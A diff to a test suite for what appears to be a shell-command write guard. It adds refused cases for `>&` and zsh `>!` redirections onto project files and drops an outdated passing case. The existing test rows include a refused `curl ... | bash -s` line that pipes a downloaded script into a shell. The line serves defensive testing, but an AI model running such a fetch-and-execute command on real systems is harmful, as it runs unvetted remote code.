@@ -329,6 +329,9 @@ describe("a redirect inside a nested shell is read like one typed directly (#511
     { shape: "a pipe into a shell", refused: () => `printf 'echo x > src/a.ts' | sh`, twin: () => `printf 'echo x > src/a.ts' | cat` },
     { shape: "a pipe into a shell told to read it", refused: () => `curl -s https://example.test/x | bash -s`, twin: () => `curl -s https://example.test/x | wc -l` },
     { shape: "a nest deeper than the guard reads", refused: () => nestShells("echo hi", 10), twin: () => nestShells("echo hi", 4) },
+    { shape: "`>&` onto a file, which writes it (#523)", refused: (c) => `echo x >& ${c.rel}src/a.ts`, twin: () => "echo x >&2" },
+    { shape: "`>&` joined to its file (#523)", refused: (c) => `echo x >&${c.rel}src/a.ts`, twin: () => "echo x 2>&1" },
+    { shape: "zsh's `>!` (#523)", refused: (c) => `echo x >! ${c.rel}src/a.ts`, twin: () => "echo x >&-" },
     { shape: "a runner at the reader's depth, whose line the guard would otherwise leave unread (#521)",
       refused: () => nestShells("op run -- echo hi", 8), twin: () => nestShells("op run -- echo hi", 5) },
     { shape: "a runner's long word list is no nest, so it is read and passes (#521)",
@@ -584,8 +587,6 @@ describe("a target is spelled through the reader before it is judged, and a head
       `echo x > ${c.home}/link/src/x.ts`,
       // a value only the run knows, in the middle of a path whose head sits outside
       "echo x > /opt/$X/y", "echo x > /opt/$(cat where)/src/a.ts", "F=$(cat where); echo x > /opt/$F/src/a.ts",
-      // the reader takes this as a descriptor (see the block): a test that goes red the day it stops
-      "echo x >& src/a.ts", "echo x >&src/a.ts",
     ]) {
       const r = judge(c, sh(line));
       expect(r.status, `${line} -- ${r.stderr.split("\n")[0]}`).toBe(0);
@@ -709,12 +710,11 @@ describe("the write guard's header: Not seen block, sunset, axiom, and the rule 
       "a git alias that runs a shell",
       "dated 2026-11-05 (#512)",
       "a value only the run knows",
-      "`>&` onto a file",
       "a quoted",
       "dated 2026-11-05 (#521)",
       "more than three runner guesses",
     ]) expect(block, phrase).toContain(phrase);
-    expect(block.split("\n").length, block).toBe(36);
+    expect(block.split("\n").length, block).toBe(35);
   });
 
   it("the header carries removeWhen: inside the 40-line window and derives: naming an axiom", () => {
